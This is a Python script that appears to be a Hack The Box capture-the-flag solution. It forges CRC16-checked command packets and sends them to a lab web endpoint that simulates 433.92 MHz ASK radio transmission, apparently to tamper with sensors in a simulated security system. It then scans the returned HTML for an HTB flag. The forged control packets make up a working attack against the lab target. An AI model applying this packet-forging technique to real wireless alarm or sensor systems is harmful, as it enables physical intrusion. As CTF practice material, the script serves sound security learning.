#!/usr/bin/env python3
import requests
import struct
import time
import re

def crc16(data, poly=0x1D0F):
    crc = 0x0000
    for byte in data:
        crc ^= (byte << 8)
        for _ in range(8):
            if crc & 0x8000:
                crc = ((crc << 1) ^ poly) & 0xFFFF
            else:
                crc = (crc << 1) & 0xFFFF
    return crc

base_url = 'http://94.237.53.81:59575'

# INNOVACIÓN 65: Analizar el estado completo de la página después de enviar
print("[*] INNOVACIÓN 65: Análisis profundo del HTML después de enviar")
s = requests.Session()
r_before = s.get(base_url)

# Enviar comandos
for addr, cmd in [(0xE1, 0xFF), (0xE2, 0xFF), (0xE3, 0xFF), (0xA1, 0xF1), (0xA2, 0xF1), (0xA3, 0xF1), (0xA4, 0xF1)]:
    data = bytes([addr, cmd])
    crc = crc16(data)
    packet = (data + struct.pack('<H', crc)).hex().upper()
    s.post(f'{base_url}/transmit', data={'freq': '433.92', 'mod': 'ASK', 'bits': '1', 'msg': packet})

time.sleep(5)
r_after = s.get(base_url)

# Comparar ANTES y DESPUÉS
print(f"HTML length before: {len(r_before.text)}")
print(f"HTML length after: {len(r_after.text)}")

if len(r_before.text) != len(r_after.text):
    print("[+] HTML changed!")
    
# Buscar diferencias
before_lines = set(r_before.text.split('\n'))
after_lines = set(r_after.text.split('\n'))

new_lines = after_lines - before_lines
removed_lines = before_lines - after_lines

if new_lines:
    print(f"\n[+] New lines in HTML ({len(new_lines)}):")
    for line in list(new_lines)[:10]:
        print(f"  + {line[:100]}")
        if 'HTB' in line or 'flag' in line.lower():
            print(f"  [!] INTERESTING: {line}")

if removed_lines:
    print(f"\n[+] Removed lines ({len(removed_lines)}):")
    for line in list(removed_lines)[:10]:
        print(f"  - {line[:100]}")

# INNOVACIÓN 66: Buscar en TODAS las tablas HTML
print("\n[*] INNOVACIÓN 66: Extraer todas las tablas")
tables = re.findall(r'<table>(.*?)</table>', r_after.text, re.DOTALL)
print(f"Found {len(tables)} tables")
for i, table in enumerate(tables):
    print(f"\nTable {i}:")
    print(table[:300])
    if 'HTB' in table:
        print(f"[SUCCESS] Flag in table {i}!")
        print(re.findall(r'HTB\{[^}]+\}', table))

# INNOVACIÓN 67: Analizar el estado de los sensores en detalle
print("\n[*] INNOVACIÓN 67: Estado detallado de sensores")
sensor_states = re.findall(r'(text-\w+)', r_after.text)
print(f"Sensor states found: {set(sensor_states)}")

# Buscar clases CSS específicas
for state in ['text-danger', 'text-success', 'text-warning', 'text-info', 'text-secondary']:
    count = r_after.text.count(state)
    print(f"  {state}: {count} occurrences")

print("\n[*] Deep analysis done")
